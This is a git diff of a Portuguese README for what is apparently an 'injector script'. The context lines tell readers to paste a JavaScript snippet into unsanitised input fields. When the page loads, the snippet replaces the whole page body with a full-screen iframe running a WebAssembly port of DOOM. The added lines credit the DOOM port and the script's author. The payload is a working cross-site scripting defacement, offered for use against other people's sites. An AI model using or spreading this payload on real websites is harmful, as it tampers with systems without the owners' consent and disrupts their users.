@@ -46,3 +46,8 @@ Em campos de input vulneráveis (sem sanitização adequada), você pode utiliza
 <script>
 (function(){function i(){document.body.innerHTML='<iframe src="[https://diekmann.github.io/wasm-fizzbuzz/doom/](https://diekmann.github.io/wasm-fizzbuzz/doom/)" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999;"></iframe>'}if(document.readyState==="complete"){i()}else{window.addEventListener('load',i)}})();
 </script>
+```
+## Credits
+
+- **DOOM Wasm Port:** O porte do jogo para WebAssembly é mantido por [diekmann](https://github.com/diekmann/wasm-fizzbuzz).
+- **Injector Script:** Desenvolvido por [PedroL-Melo].
